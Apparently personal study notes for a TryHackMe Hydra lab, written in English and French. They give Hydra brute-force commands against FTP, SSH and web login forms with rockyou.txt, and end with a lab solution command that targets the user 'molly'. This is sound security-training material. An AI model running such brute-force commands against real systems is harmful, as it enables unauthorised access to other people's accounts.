## PATH : Comptia pentest+

## [Hydra - ROOM](https://tryhackme.com/room/hydra)


It is a software which enables to perfom brute force over a 

Generally the passworld list is rockyoutxt stored here : /usr/share/wordlists/rockyou.txt

Example : 
* `ftp` : hydra -l user -P passlist.txt ftp://10.10.12.179

* `ssh` : hydra -l <username> -P <full path to pass> 10.10.12.179 -t 4 ssh

        servicesOption   |	Description
        _____________________________
        -l	           | specifies the (SSH) username for login
        _______________________________
        -P	           | indicates a list of passwords
        _________________________________
        -t	           | sets the number of threads to spawn   


*   `Post web form` : sudo hydra -l <username> -P <wordlist> 10.10.12.179 http-post-form "<path>:<login_credentials>:<invalid_response>"

            Option |	Description
            -l	   | the username for (web form) login
            -P	   | the password list to use http-post-form	the type of the form is POST
            <path> |  the login page URL, for example, login.php
            <login_credentials> |	the username and password used to log in, for example, username=^USER^&password=^PASS^
            <invalid_response>	| part of the response when the login fails
            -V	verbose output for every attempt

A more concrete example :

    hydra -l <username> -P <wordlist> 10.10.12.179 http-post-form "/endpoint:username=^USER^&password=^PASS^:F=incorrect" -V

-  The login page is only /, i.e., the main IP address.
- The username is the form field where the username is entered
- The specified username(s) will replace ^USER^
- The password is the form field where the password is entered
- The provided passwords will be replacing ^PASS^
- Finally, F=incorrect is a string that appears in the server reply when the login fails


Tips : 
* Utiliser BurpSuite pour intercepter la requête et voir quels champs sont envoyés (username ? login ?  && password ?)
* Ensuite on Il faut remplace /endpoint par le endpoint sur lequel le post doit être fait.

#### Solution Task 2 
1. hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.12.179 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

2. 

